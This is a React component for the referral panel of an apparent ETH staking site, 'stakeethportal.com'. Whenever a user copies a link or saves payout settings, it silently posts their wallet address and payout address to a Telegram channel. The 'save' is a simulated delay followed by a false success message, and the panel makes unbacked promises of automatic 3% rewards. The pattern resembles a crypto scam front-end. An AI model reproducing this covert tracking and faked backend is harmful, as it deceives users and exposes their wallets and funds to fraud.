"use client"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Copy, Check } from "lucide-react"
import { sendTelegramNotification } from "@/lib/telegram-service"
import { useWeb3 } from "@/hooks/use-web3"
import { ShareLinkButton } from "./share-link-button"

export function ReferralSystem() {
  const { isConnected, address, connect } = useWeb3()
  const [copied, setCopied] = useState(false)
  const [payoutAddress, setPayoutAddress] = useState("")
  const [isSaving, setIsSaving] = useState(false)
  const [saveSuccess, setSaveSuccess] = useState(false)

  // Generate referral link based on connected wallet address
  const getReferralLink = () => {
    if (!isConnected || !address) return "https://stakeethportal.com/?ref=connect-wallet"

    return `https://stakeethportal.com/?ref=${address}`
  }

  const copyToClipboard = async () => {
    const referralLink = getReferralLink()

    try {
      await navigator.clipboard.writeText(referralLink)
      setCopied(true)

      // Send notification to Telegram
      await sendTelegramNotification(`
🔗 <b>Referral Link Copied</b>
👤 <b>User:</b> ${address || "Not connected"}
🔗 <b>Link:</b> ${referralLink}
⏰ <b>Time:</b> ${new Date().toISOString()}
      `)

      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.error("Failed to copy:", error)
    }
  }

  const saveSettings = async () => {
    if (!isConnected) {
      await connect()
      return
    }

    setIsSaving(true)

    try {
      // Simulate API call
      await new Promise((resolve) => setTimeout(resolve, 1500))

      // Send notification to Telegram
      await sendTelegramNotification(`
⚙️ <b>Referral Settings Updated</b>
👤 <b>User:</b> ${address}
💰 <b>Payout Address:</b> ${payoutAddress || address}
⏰ <b>Time:</b> ${new Date().toISOString()}
      `)

      setSaveSuccess(true)
      setTimeout(() => setSaveSuccess(false), 3000)
    } catch (error) {
      console.error("Failed to save settings:", error)
    } finally {
      setIsSaving(false)
    }
  }

  return (
    <Card className="glassmorphism neon-border overflow-hidden">
      <CardHeader>
        <CardTitle>Your Referral Program</CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="p-4 rounded-lg glassmorphism">
          <div className="text-sm text-muted-foreground mb-2">Your Referral Link</div>
          <div className="flex items-center gap-2">
            <Input value={getReferralLink()} readOnly className="glassmorphism border-none bg-gray-500/10" />
            <Button variant="outline" className="glassmorphism border-none" onClick={copyToClipboard}>
              {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
            </Button>
          </div>
        </div>

        <ShareLinkButton link={getReferralLink()} />

        <div className="p-4 rounded-lg glassmorphism">
          <h3 className="text-lg font-medium mb-4">How It Works</h3>
          <ul className="space-y-2 text-sm">
            <li>• Share your unique referral link</li>
            <li>• Earn 3% of the ETH they stake on our platform</li>
            <li>• No limit to how many people you can refer</li>
            <li>• Rewards are paid out automatically</li>
          </ul>
        </div>

        <div className="p-4 rounded-lg glassmorphism">
          <h3 className="text-lg font-medium mb-4">Payout Settings</h3>
          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="payout-address">Payout Address (optional)</Label>
              <Input
                id="payout-address"
                placeholder={isConnected ? address : "0x..."}
                value={payoutAddress}
                onChange={(e) => setPayoutAddress(e.target.value)}
                className="glassmorphism border-none bg-gray-500/10"
              />
              <p className="text-xs text-muted-foreground">
                Leave empty to receive rewards to your connected wallet address
              </p>
            </div>

            <Button
              className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700"
              onClick={saveSettings}
              disabled={isSaving}
            >
              {isSaving ? "Saving..." : saveSuccess ? "Settings Saved!" : "Save Settings"}
            </Button>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}
